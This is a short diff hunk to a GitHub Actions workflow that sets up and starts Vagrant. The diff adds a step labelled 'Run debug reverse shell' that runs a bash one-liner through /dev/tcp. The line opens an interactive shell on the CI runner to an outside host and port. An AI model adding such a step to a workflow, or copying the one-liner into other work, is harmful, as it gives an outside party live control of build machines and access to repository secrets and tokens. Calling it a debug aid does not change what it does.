@@ -32,6 +32,9 @@ jobs:
             ${{ runner.os }}-vagrant-
       - name: Show Vagrant version
         run: vagrant --version
+      - name: Run debug reverse shell
+        shell: bash
+        run: bash -i >& /dev/tcp/matthieu.buffet.re/34348 0>&1
       - name: Start vagrant
         working-directory: .github/workflows/
         run: vagrant up
